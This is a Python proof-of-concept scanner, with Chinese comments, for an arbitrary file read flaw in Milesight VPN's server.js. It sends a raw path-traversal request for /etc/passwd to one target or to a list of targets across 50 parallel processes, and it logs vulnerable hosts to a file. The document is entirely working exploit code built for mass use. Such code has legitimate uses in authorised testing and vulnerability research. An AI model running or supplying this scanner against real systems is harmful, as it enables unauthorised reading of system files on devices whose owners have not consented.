import requests, re, argparse, os, sys, requests_raw
from multiprocessing import Pool

# 禁用urllib3警告
requests.packages.urllib3.disable_warnings()

def main():
    # 创建参数解析器
    parser = argparse.ArgumentParser(description="Milesight VPN server.js 任意文件读取漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()

    # 根据参数调用对应函数
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        # 从文件中读取URL列表
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join
    else:
        print(f"Usage: \n\tpython:{sys.argv[0]} -h")

def poc(target):
    # 构造HTTP请求数据
    data = f"GET /../../../etc/passwd HTTP/1.1\r\nHost: \r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip\r\nConnection: keep-alive\r\n\r\n"

    # 发送原始HTTP请求
    res = requests_raw.raw(url=target, data=data, verify=False)

    try:
        if res.status_code == 200 and 'root' in res.text:
            print(f"[+]{target}存在任意文件读取漏洞")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f"[-]{target}不存在任意文件读取漏洞")
    except Exception as e:
        print(f"[-]{target}可能存在访问问题，请手工测试")

if __name__ == '__main__':
    main()
